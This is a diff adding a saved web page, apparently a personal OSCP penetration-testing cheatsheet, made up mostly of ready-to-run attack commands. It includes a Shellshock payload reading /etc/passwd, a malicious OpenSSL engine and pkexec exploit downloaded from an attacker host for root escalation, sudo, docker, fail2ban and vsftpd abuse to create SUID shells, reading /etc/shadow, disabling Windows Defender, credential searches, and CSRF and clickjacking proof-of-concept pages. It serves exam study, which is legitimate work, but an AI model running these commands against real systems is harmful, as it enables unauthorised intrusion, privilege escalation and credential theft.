+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+</code></pre></div></div>
+
+<h3 id="interactive-shell">Interactive shell</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Python
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Bash
+echo os.system('/bin/bash')
+
+# Sh
+/bin/bash -i
+
+# Perl
+perl -e 'exec "/bin/bash"'
+
+# Ruby
+exec "/bin/bash"
+
+# Lua
+os.execute('/bin/bash')
+</code></pre></div></div>
+
+<h3 id="adjust-interactive-shell">Adjust Interactive shell</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty size # Find your terminal size -&gt; 50 235
+Ctrl-Z
+stty raw -echo  // Disable shell echo
+fg
+export SHELL=bash
+export TERM=xterm OR export TERM=xterm-256color
+stty rows 50 columns 235
+</code>
+</pre></div></div>
+<!-- <Dane> -->
+<p>or</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+python -c 'import pty;pty.spawn("/bin/bash")';
+export TERM=xterm
+</code>
+</pre></div></div>
+<!-- </Dane> -->
+<hr>
+
+<h2 id="shellshock">SHELLSHOCK</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" &lt;URL&gt;/cgi-bin/&lt;SCRIPT&gt;
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="useful-linux-commands">USEFUL LINUX COMMANDS</h2>
+
+<h3 id="find-a-file">Find a file</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate &lt;FILE&gt;
+find / -name "&lt;FILE&gt;" 2>/dev/null
+#find files can be read and used by user
+find / -user &lt;user> 2>/dev/null
+#find files owned by user
+find / -user elyana -type f 2>&1 | grep -v "Permission" | grep -v "No such"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#File all text file (not only .txt)
+find . -type f -exec grep -Iq . {} \; -print
+#Find all text content
+grep -rnw &lt;/opt/&gt; -e <'aubreanna'>
+  #but return file name
+    find / -type f -exec grep -l "text-to-find-here" {} \;
+#Find creds manually
+/opt
+</code></pre></div></div>
+<h3 id="find-a-file">Reverse string, list order</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "abc" | rev #cba
+tac list.txt #reverse line order in list.txt
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Remove duplicates
+sort combined_list.txt | uniq -u > cleaned_combined_list.txt
+</code></pre></div></div>
+<h3 id="active-connection">Active connection</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat -lntp
+</code></pre></div></div>
+
+<h3 id="list-all-suid-files">List all SUID files</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -4000 2&gt;/dev/null
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/doas
+(check: cat /etc/doas.conf)
+Example: permit nopass USER as root cmd openssl
+LFILE=/root/root.txt
+doas -u root openssl enc -in "$LFILE"
+OR
+#Attacker
+Create exploit.c:
+<strong>#include &lt;openssl/engine.h&gt;
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0); setgid(0);
+  system("/bin/bash");
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()</strong>
+
+gcc -fPIC -o exploit.o -c exploit.c (warning output can be ignored)
+gcc -shared -o exploit.so -lcrypto exploit.o
+#Victim
+Copy exploit.o from attacker:
+doas openssl req -engine ./exploit.so
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/pkexec
+#Attacker
+wget https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c -o exploit.c
+python3 -m http.server 8000
+
+#Victim
+wget http://attacker-ip:8000/exploit.c
+gcc exploit.c -o exploit
+./exploit
+
+#Other exploit using python3:
+https://github.com/Almorabea/pkexec-exploit
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/docker
+docker images
+docker run -v /:/mnt --rm -it images:tag chroot /mnt sh
+</code></pre></div></div>
+
+<h3 id="list-all-suid-files">List all capability files</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getcap -r / 2>/dev/null
+#cap_fowner
+/usr/bin/&lt;program&gt; -e 'chmod 04777, "/bin/bash";'
+/bin/bash -p
+
+#/usr/bin/openssl = cap_setuid+ep
+  https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/
+</code></pre></div></div>
+<h3 id="determine-the-current-version-of-linux">Determine the current version of Linux</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> cat /etc/issue
+</code></pre></div></div>
+
+<h3 id="determine-more-information-about-the-environment">Determine more information about the environment</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>uname -a
+</code></pre></div></div>
+
+<h3 id="list-processes-running">List processes running</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps -faux
+#pspy - unprivileged Linux process snooping
+https://github.com/DominicBreuker/pspy
+</code></pre></div></div>
+
+<h3 id="list-the-allowed-and-forbidden-commands-for-the-invoking-use">List the allowed (and forbidden) commands for the invoking use</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
+#(user) NOPASSWD: ALL
+sudo -u &lt;user&gt; bash
+#(root) NOPASSWD: /bin/systemctl restart fail2ban
+  #view fail2ban config
+  cat /etc/fail2ban/jail.local
+  #check if /etc/fail2ban/action.d is writable
+  nano /etc/fail2ban/action.d/iptables-multiport.conf
+    actionban = cp /bin/bash /home/user/shell; chmod +xs /home/user/shell
+  sudo /bin/systemctl restart fail2ban
+  #trigger by ssh fails 3 times (defined in jail.local)
+  ./tmp/shell -p
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(ALL : ALL) /usr/sbin/service vsftpd restart
+find / -type f -name "vsftpd*" 2>/dev/null
+nano /lib/systemd/system/vsftpd.service
+  ExecStart=/bin/bash -c "cp /bin/bash /tmp/shell; chmod +xs /tmp/shell"
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(ALL, !root) /bin/bash
+sudo -u#-1 /bin/bash
+(https://www.exploit-db.com/exploits/47502)
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(user : ALL) NOPASSWD: command
+sudo -u user command
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apache2 -f /etc/shadow
+echo '[Pasted Root Hash]' > hash.txt
+john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
+</code></pre></div></div>
+
+<h3 id="pe-group">Privilege Escalation group</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>999(docker) -> SUID: docker
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="useful-windows-commands">USEFUL WINDOWS COMMANDS</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net config Workstation
+systeminfo
+net users
+
+ipconfig /all
+netstat -ano
+
+schtasks /query /fo LIST /v
+tasklist /SVC
+net start
+DRIVERQUERY
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+dir /s pass == cred == vnc == .config
+findstr /si password *.xml *.ini *.txt
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+# Disable windows defender
+sc stop WinDefend
+
+# Bypass restriction
+powershell -nop -ep bypass
+
+# List hidden files
+dir /a
+
+# Find a file
+dir /b/s "&lt;FILE&gt;"
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="zip">ZIP</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip
+
+zip2john file.zip &gt; zip.john
+john --wordlist=&lt;PASSWORDS_LIST&gt; zip.john
+</code></pre></div></div>
+<hr>
+
+<h2 id="msf">Metasploit</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Upgrade Normal Shell To Meterpreter Shell
+sessions -u -1
+#Select session for interacting
+sessions -i -1
+
+#pivoting
+route add 172.28.101.51/32 -1
+</code></pre></div></div>
+<hr>
+
+<h2 id="web-pentest">For Web Pentest</h2>
+<h3 id="#">Process</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Crawl carefully, try not to miss any request:
+  - Active scan
+  - Manually web browsing (try to understand web logic, businesses)
+  - Hidden files, directories scan
+-> Fill excel file
+(“If I only had an hour to chop down a tree, I would spend the first 45 minutes sharpening my axe.” – Abraham Lincoln.)
+2. Test every request, map every parameter in request with function to be clearer
+3. Review overall: spend rest of time try to RCE (if not yet)
+4. Report
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Multiple requests CSRF
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;EUC-JP&quot;&gt;
+    &lt;title&gt;CSRF Test page&lt;/title&gt;
+    &lt;script&gt;
+      var interval = 200;
+      var i = 0;
+      var formNum = 0;
+      window.onload = function() {
+        formNum = document.forms.length;
+        sendRequest();
+      };
+      var sendRequest = function() {
+        document.forms[i].submit();
+        i++;
+        if(i &lt; formNum) {
+          setTimeout(sendRequest, interval);
+        }
+      };
+    &lt;/script&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+    &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;
+    &lt;form action=&quot;#&quot; method=&quot;POST&quot; target=&quot;dummyIframe&quot;&gt;
+    &lt;/form&gt;
+    &lt;form action=&quot;#&quot; method=&quot;POST&quot; target=&quot;dummyIframe&quot;&gt; 
+       &lt;input type=&quot;hidden&quot; name=&quot;mode&quot; value=&quot;SEND&quot;&gt; 
+    &lt;/form&gt;
+  &lt;/body&gt;
+  &lt;iframe style=&quot;display: hidden&quot; height=&quot;0&quot; width=&quot;0&quot; frameborder=&quot;0&quot; name=&quot;dummyIframe&quot;&gt;&lt;/iframe&gt;
+&lt;/html&gt;
+
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Sample click jacking
+&lt;html&gt;
+
+&lt;head&gt;
+
+&lt;style type="text/css"&gt;
+
+&lt;!--
+
+#iframe {
+
+    position: absolute;
+
+    top: 0px;
+
+    left: 0px;
+
+    Filter:alpha(opacity=0.1);
+
+    -moz-opacity: 0.1;
+
+    opacity: 0.1;
+
+    z-index: 10;
+
+}
+
+--&gt;
+
+&lt;/style&gt;
+
+&lt;/head&gt;
+
+&lt;body&gt;
+
+&lt;iframe id="iframe" src="●●●" width="100%" height="100%"&gt;&lt;/iframe&gt;
+
+&lt;div style="font-size:30px; bold; position:fixed; top:30px; left:30px"&gt;
+
+    &lt;a href="javascript:alert('clicked')"&gt;This is test page.&lt;/a&gt;
+
+&lt;/div&gt;
+
+&lt;/body&gt;
+
+&lt;/html&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><strong>#SSTI tool</strong>
+https://github.com/epinna/tplmap
+Example usage: tplmap -u http://10.10.10.10:5000/ -d 'noot' --os-cmd 'cat /etc/passwd'
+</code></pre></div></div>
+	  </div>
+
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="https://liodeus.github.io/tags.html#OSCP-ref">
+					OSCP <span>(30)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="https://liodeus.github.io/tags.html#Cheatsheet-ref">
+					Cheatsheet <span>(5)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/intent/tweet?text=Write-up%20from%20Liodeus%20on%20OSCP%20personal%20cheatsheet%20:%20https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html&amp;hashtags=OSCP,Cheatsheet," onclick="window.open(this.href, &#39;twitter-share&#39;, &#39;width=550,height=235&#39;);return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php" onclick="window.open(this.href, &#39;facebook-share&#39;,&#39;width=580,height=296&#39;);return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus" onclick="window.open(&#39;https://plus.google.com/share?url=&#39;+window.location.href, &#39;google-plus-share&#39;, &#39;width=490,height=530&#39;);return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="https://liodeus.github.io/2020/08/11/bufferOverflow.html" title="Buffer Overflow personal cheatsheet">← Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="https://liodeus.github.io/2020/10/19/OSCP-exam-report-training.html" title="OSCP exam report - training">Next →</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr>
+			<p>
+				© 2021 Liodeus.
+			</p>
+		</footer>
+	</div>
+
+	<script async="" src="./OSCP personal cheatsheet_files/analytics.js.download"></script><script type="text/javascript" src="./OSCP personal cheatsheet_files/jquery.min.js.download"></script>
+	<script type="text/javascript" src="./OSCP personal cheatsheet_files/bootstrap.min.js.download"></script>
+	<script type="text/javascript" src="./OSCP personal cheatsheet_files/app.js.download"></script>
+
+
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'Liodeus', 'auto');
+  ga('send', 'pageview');
+</script>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
